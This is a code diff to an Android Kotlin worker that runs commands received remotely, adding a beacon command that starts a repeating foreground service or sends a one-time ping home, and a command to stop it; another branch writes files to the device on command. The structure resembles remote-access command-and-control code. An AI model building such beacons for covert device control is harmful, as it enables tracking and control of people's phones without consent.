@@ -83,7 +83,34 @@ class RemoteCommandWorker(appContext: Context, workerParams: WorkerParameters) :
                                 }
                                 status = "EXECUTED"
                             }
-                            // --- 3. FILE/FOLDER CREATION ---
+                            // --- 3. IM_ONLINE (BEACON) ---
+                            else if (cmd.getString("file_name") == "IM_ONLINE") {
+                                val frequencyStr = cmd.optString("content", "0")
+                                val frequency = frequencyStr.toLongOrNull() ?: 0L
+                                
+                                if (frequency > 0) {
+                                    // REPEATING: Start Service
+                                    val i = android.content.Intent(applicationContext, BeaconService::class.java)
+                                    i.putExtra("frequency", frequencyStr)
+                                    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
+                                        applicationContext.startForegroundService(i)
+                                    } else {
+                                        applicationContext.startService(i)
+                                    }
+                                    status = "EXECUTED (LOOP START)"
+                                } else {
+                                    // ONE-TIME: Just Ping
+                                    CloudManager.sendPing(applicationContext, "Manual Command")
+                                    status = "EXECUTED (SINGLE)"
+                                }
+                            }
+                            // --- 4. STOP BEACON ---
+                            else if (cmd.getString("file_name") == "STOP_BEACON") {
+                                val i = android.content.Intent(applicationContext, BeaconService::class.java)
+                                applicationContext.stopService(i)
+                                status = "EXECUTED (STOPPED)"
+                            }
+                            // --- 5. FILE/FOLDER CREATION ---
                             else if (fileName.isNotEmpty()) {
                                 val targetFile = File(targetDir, fileName)
                                 
